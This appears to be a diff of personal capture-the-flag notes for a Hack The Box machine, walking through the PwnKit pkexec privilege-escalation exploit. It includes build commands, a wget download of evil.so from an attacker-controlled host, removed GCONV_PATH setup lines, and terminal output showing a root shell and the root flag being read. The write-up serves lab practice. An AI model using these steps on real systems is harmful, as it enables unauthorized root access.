@@ -1,8 +1,14 @@
 On Kali:
+if you find /usr/bin/pkexec
+and version of this is 0.105
 
-https://packetstorm.news/files/id/165739
+## https://packetstorm.news/files/id/165739 ## -> create file acc to they mentioned
 
-cd ~/Desktop/htb/htb2/again
+do -> make all 
+do -> ./exploit (two binaries will be created after doing make all)
+if the baove two command s wont work 
+
+run this manually
 
 gcc -shared -fPIC -o evil.so evil-so.c
 gcc exploit.c -o exploit
@@ -20,21 +26,52 @@ wget http://10.10.14.106:8000/evil.so
 
 chmod +x exploit
 
-mkdir -p 'GCONV_PATH=.'
-cp /usr/bin/true 'GCONV_PATH=./evil.so:.'
-
-echo 'module UTF-8// PWNKIT// evil 2' > gconv-modules
+gcc -shared -fPIC -o evil.so evil-so.c
+gcc exploit.c -o exploit
 
 ./exploit
+   ```
+      nathan@cap:/tmp/again$ make all
+Makefile:5: *** missing separator.  Stop.
+nathan@cap:/tmp/again$ gcc -shared -fPIC -o evil.so evil-so.c
+evil-so.c: In function ‘gconv_init’:
+evil-so.c:10:5: warning: implicit declaration of function ‘setgroups’; did you mean ‘getgroups’? [-Wimplicit-function-declaration]
+   10 |     setgroups(0);
+      |     ^~~~~~~~~
+      |     getgroups
+evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
+   12 |     execve("/bin/sh", NULL, NULL);
+      |     ^~~~~~
+nathan@cap:/tmp/again$ gcc exploit.c -o exploit
+exploit.c: In function ‘main’:
+exploit.c:25:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
+   25 |     execve(BIN, argv, envp);
+      |     ^~~~~~
+nathan@cap:/tmp/again$ ls -l
+total 52
+-rw-rw-r-- 1 nathan nathan   150 Jun  3 10:00 Makefile
+-rw-rw-r-- 1 nathan nathan   183 Jun  3 09:58 evil-so.c
+-rwxrwxr-x 1 nathan nathan 16392 Jun  3 10:02 evil.so
+-rwxrwxr-x 1 nathan nathan 16800 Jun  3 10:02 exploit
+-rw-rw-r-- 1 nathan nathan   614 Jun  3 09:58 exploit.c
+nathan@cap:/tmp/again$ id
+uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
+nathan@cap:/tmp/again$ ./exploit
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls
+'GCONV_PATH=.'   Makefile   evil-so.c   evil.so   evildir   exploit   exploit.c
+# cd ../../
+# ls
+bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
+# cd root
+# ls
+root.txt  snap
+# cat root.txt
+
+  ```
+
 ```
-
-If successful:
-
-```bash id="m1v9dx"
-id
-cat /root/root.txt
-```
-
 
 
 /etc/hosts
